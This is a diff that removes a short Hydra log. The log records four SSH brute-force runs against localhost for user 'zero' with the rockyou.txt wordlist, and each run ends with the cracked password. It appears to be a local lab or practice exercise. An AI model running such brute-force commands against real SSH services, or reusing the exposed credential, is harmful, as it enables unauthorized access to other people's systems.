@@ -1,8 +1,0 @@
-# Hydra v9.5 run at 2024-09-25 16:13:12 on localhost ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://localhost)
-[22][ssh] host: localhost   login: zero   password: 21RussellLucy
-# Hydra v9.5 run at 2024-09-25 16:14:54 on 127.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
-[22][ssh] host: 127.0.0.1   login: zero   password: 21RussellLucy
-# Hydra v9.5 run at 2024-09-25 16:19:40 on 127.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
-[22][ssh] host: 127.0.0.1   login: zero   password: 21RussellLucy
-# Hydra v9.5 run at 2024-09-25 16:20:32 on 127.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
-[22][ssh] host: 127.0.0.1   login: zero   password: 21RussellLucy
